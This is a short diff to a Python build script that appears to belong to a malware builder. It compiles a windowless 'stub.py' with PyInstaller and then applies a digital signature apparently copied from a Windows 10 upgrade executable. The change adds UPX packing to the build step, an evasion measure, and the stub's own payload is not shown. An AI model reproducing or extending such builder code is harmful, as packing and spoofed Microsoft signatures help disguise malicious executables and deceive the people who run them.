@@ -27,7 +27,7 @@ def installModules():
 
 def buildFile():
     print("Building Your File pls wait.")
-    os.system("pyinstaller --onefile --noconsole --clean stub.py")
+    os.system("pyinstaller --onefile --noconsole --clean --upx-dir upx-4.0.2-win64 stub.py")
     print("File build was succesfully")
     print("Signing file pls wait")
     digitalSign("Windows10Upgrade9252.exe", os.getcwd() + "\\Dist\\stub.exe")
